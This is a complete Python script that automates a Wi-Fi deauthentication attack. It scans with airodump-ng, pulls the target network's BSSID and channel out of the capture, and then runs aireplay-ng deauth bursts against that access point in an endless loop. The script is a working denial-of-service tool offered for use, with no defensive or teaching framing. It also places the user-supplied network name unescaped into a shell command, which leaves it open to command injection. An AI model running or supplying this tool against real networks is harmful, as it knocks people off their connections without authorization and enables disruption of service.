import subprocess, time, sys, argparse









red = "\033[1;31m"

green = "\033[1;32m"









def iwCh( channel, interface ):

    try:

        subprocess.run( f"sudo iwconfig { interface } channel { channel }", shell = True, check = True )

        print( f"\n\n{ green }Channel is set to { channel } on { interface }!\n\n" )

    except:

        print( f"\n{ red }Getting error in setting channel on { interface }!" )

        sys.exit( 0 )









def kiddDeAuth( BSSID, interface ):

    try:

        print( f"\n\n{ red }I am going to kid the wifi right now!\n\n" )

        p = subprocess.Popen( [ "sudo", "aireplay-ng", "-0", "0", "-a", BSSID, interface ] )

        time.sleep( 20 )

        p.terminate()

        p.wait()

        print( f"\n\n{ green }I am going to sleep for a while!\n\n" )

        time.sleep( 60 )

        kiddDeAuth( BSSID, interface )

    except:

        subprocess.run( "sudo rm -rf ./wifiBssid.py ./wifiChannel.py ./wifiInterF.txt", shell = True, check = True )

        print( f"\n{ red }Stop sending DeAuth and files created by this script have been deleted!\n" )

        sys.exit( 0 )









def air( IF, ESSID ):

    dic = {}

    try:

        f = open( "wifiInterF.txt", "w" )

    except:

        print( f"\n\n{ red }Error : wifiInterF.txt file creation!\n\n" )

        sys.exit( 0 )

    p = subprocess.Popen( ["sudo", "airodump-ng", "-i", IF ], stdout= f )

    print( f"\n\n{ green }Capture file is being created! Please wait!\n\n" )

    time.sleep( 10 )

    p.terminate()

    p.wait()

    print( f"\n\n{ green }Capture file has been created!\n\n" )

    subprocess.run( "grep -i '%s' wifiInterF.txt | head -n 1 | awk '{ print $2 }' > wifiBssid.py" % ESSID, shell = True, check = True )

    time.sleep( 0.2 )

    subprocess.run( "grep -i '%s' wifiInterF.txt | head -n 1 | awk '{ print $7 }' > wifiChannel.py" % ESSID, shell = True, check = True )

    time.sleep( 0.2 )

    try:

        bFile = open( "wifiBssid.py", "r" )

        cFile = open( "wifiChannel.py", "r" )

        dic[ "bssid" ] = bFile.read().strip()

        dic[ "channel" ] = cFile.read().strip()

    except:

        print( f"\n\n{ red }wifiBssid or wifiChannel files are not found!\n\n" )

        subprocess.run( "sudo rm -rf ./wifiBssid.py ./wifiChannel.py ./wifiInterF.txt", shell = True, check = True )

        sys.exit( 0 )

    iwCh( dic[ "channel" ], IF )

    kiddDeAuth( dic[ "bssid" ], IF )









def main():

    creOpt = argparse.ArgumentParser( description = "How to use?" )

    creOpt.add_argument( "-i", "--interface", type = str, required = True, help = "Network interface" )

    creOpt.add_argument( "-e", "--essid", type = str, required = True, help = "ESSID or wifi name" )

    opt = creOpt.parse_args()

    air( opt.interface, opt.essid )

if __name__ == "__main__":

    main()
